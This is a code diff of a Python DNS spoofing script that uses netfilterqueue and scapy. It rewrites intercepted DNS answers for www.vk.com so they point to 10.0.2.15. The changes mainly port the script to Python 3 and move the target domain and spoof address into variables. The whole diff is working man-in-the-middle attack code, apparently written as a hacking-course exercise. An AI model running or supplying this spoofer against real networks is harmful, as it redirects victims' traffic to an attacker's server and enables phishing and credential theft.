@@ -3,13 +3,17 @@ import netfilterqueue
 import scapy.all as scapy
 
 
+target_resource = "www.vk.com"
+spoof_ip = "10.0.2.15"
+
+
 def packet_analysis(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        query_name = scapy_packet[scapy.DNSQR].qname
-        if "vk.com" in query_name:
-            print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=query_name, rdata="10.0.2.15")
+        query_name = scapy_packet[scapy.DNSQR].qname.decode()
+        if target_resource in query_name:
+            print(f"[+] Spoofing target {query_name}")
+            answer = scapy.DNSRR(rrname=query_name, rdata=spoof_ip)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -18,7 +22,7 @@ def packet_analysis(packet):
             del scapy_packet[scapy.UDP].chksum
             del scapy_packet[scapy.UDP].len
 
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
